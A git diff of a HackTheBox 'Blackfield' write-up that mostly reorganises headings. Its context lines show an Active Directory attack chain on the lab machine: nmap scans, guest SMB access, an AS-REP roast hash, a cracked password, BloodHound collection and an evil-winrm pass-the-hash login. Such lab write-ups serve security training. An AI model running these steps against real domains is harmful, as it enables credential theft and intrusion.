@@ -5,9 +5,11 @@ categories: [HackTheBox]
 tags: [pentest, htb, ctf]
 ---
 
-# Blackfield (10.10.10.192)
+<figure><img src="/assets/HTB/Blackfield/blackfield.png" alt="Banner"></figure>
 
-## NMAP ports scan
+# Recon (10.10.10.192)
+
+### NMAP ports scan
 
 ```terminal
 # Nmap 7.94SVN scan initiated Thu Feb 22 12:41:07 2024 as: nmap -p- --open -sS --min-rate 5000 -n -Pn -oN ports.txt 10.10.10.192
@@ -29,7 +31,7 @@ PORT     STATE SERVICE
 
 ```
 
-## NMAP base scan
+### NMAP base scan
 
 ```terminal
 # Nmap 7.94SVN scan initiated Thu Feb 22 12:40:26 2024 as: nmap -T4 -A -Pn -oN base_scan.txt 10.10.10.192
@@ -71,7 +73,9 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-## SMB :
+## Enumeration
+
+### SMB :
 
 It was allowing no user and pass login but not listing the shares :
 
@@ -86,6 +90,8 @@ Connected using SMBCLIENT :
 ```terminal
 smbclient -U 'guest' \\\\10.10.10.192\\"profiles$"
 ```
+
+### User Enumeration
 
 After listing those directory, it seems that there were all the users directories, So I used this cmd to put into this file :
 
@@ -144,6 +150,8 @@ $krb5asrep$18$support@BLACKFIELD.LOCAL:9bc77f492e1dd61a7731af1131cec9fe$c8d87447
 ```
 
 3/314 are valid and `support` has no pre auth required, that means we can asreproast that users.
+
+### AS-REP Roasting
 
 Using impackets `GetNPUsers.py`
 
@@ -207,6 +215,8 @@ Stopped: Thu Feb 22 13:08:35 2024
 
 We have our first set of valid credentials : `support:#00^BlackKnight`
 
+## Lateral Movement 
+
 ```terminal
 ❯ cme smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares
 SMB         10.10.10.192    445    DC01      Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -223,7 +233,7 @@ SMB         10.10.10.192    445    DC01      profiles$       READ
 SMB         10.10.10.192    445    DC01      SYSVOL          READ            Logon server share 
 ```
 
-## BloodHound
+### BloodHound
 
 ```terminal
 ❯ bloodhound-python -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all                                                                                               
@@ -268,6 +278,8 @@ After analyzing through bloodhound and found that we can change the password of 
 <figure><img src="/assets/HTB/Blackfield/Untitled%202.png" alt="BloodHound"></figure>
 
 <figure><img src="/assets/HTB/Blackfield/Untitled%203.png" alt="Bloodhound Graph"></figure>
+
+## User - ForceChangePassword
 
 To change the password of the user can use the following command :
 
@@ -383,6 +395,8 @@ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 SVC_BACKUP is a part of `Backup operators` Groups.
 
 <figure><img src="/assets/HTB/Blackfield/Untitled%2010.png" alt="Groups"></figure>
+
+## Root - Backup Operators Group
 
 Abusing the Backup Operators Groups :
 
